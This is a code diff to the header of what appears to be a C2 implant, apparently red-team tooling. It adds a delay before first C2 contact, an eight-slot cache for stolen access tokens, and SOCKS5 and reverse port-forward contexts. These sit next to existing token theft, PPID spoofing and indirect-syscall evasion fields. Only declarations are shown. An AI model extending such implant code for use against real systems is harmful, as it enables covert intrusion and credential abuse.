@@ -317,6 +317,7 @@ typedef struct _INSTANCE {
         DWORD    sleep_ms;
         DWORD    jitter;
         DWORD    killdate;
+        DWORD    pre_sleep_seconds;  // guardrails: delay before first C2 contact
     } Config;
 
     // HTTP config
@@ -425,6 +426,16 @@ typedef struct _INSTANCE {
     // Token ops (make_token/steal_token/rev2self)
     HANDLE ImpersonationToken;
 
+    // Token store (token_store command): 8-slot persistent token cache
+#define ES_TOKEN_STORE_SLOTS 8
+    struct _ES_TOKEN_ENTRY {
+        HANDLE token;
+        DWORD  pid;
+        char   username[128];
+        BOOL   active;
+    } TokenStore[ES_TOKEN_STORE_SLOTS];
+    int ActiveTokenSlot;  // -1 = none active
+
     // ppid spoof target (0 = disabled); consumed by spawn/shell CreateProcess
     DWORD  SpoofPPID;
 
@@ -442,6 +453,16 @@ typedef struct _INSTANCE {
 
     // Exit function: 0 = ExitThread (default), 1 = ExitProcess
     DWORD  ExitFunc;
+
+#ifdef INCLUDE_SOCKS_PROXY
+    // SOCKS5 proxy context (heap-allocated SOCKS_CTX, see socks.h)
+    PVOID  pSocksCtx;
+#endif
+
+#ifdef INCLUDE_RPFWD
+    // Reverse port forward context (heap-allocated RPFWD_CTX, see rpfwd.h)
+    PVOID  pRpfwdCtx;
+#endif
 
 #ifdef INCLUDE_EVASION_HELLSHALL
     // ─── HellsHall indirect syscalls ───
@@ -543,6 +564,12 @@ BOOL module_stomp_init(PINSTANCE inst);
 
 // Config parsing
 VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len);
+
+// Token store helpers (cmd_token_store.cc)
+typedef struct _ES_TOKEN_ENTRY ES_TOKEN_ENTRY;
+#ifdef INCLUDE_CMD_TOKEN_STORE
+int token_store_add(PINSTANCE inst, HANDLE token, DWORD pid);
+#endif
 
 // Memory helpers
 PVOID es_malloc(PINSTANCE inst, SIZE_T size);
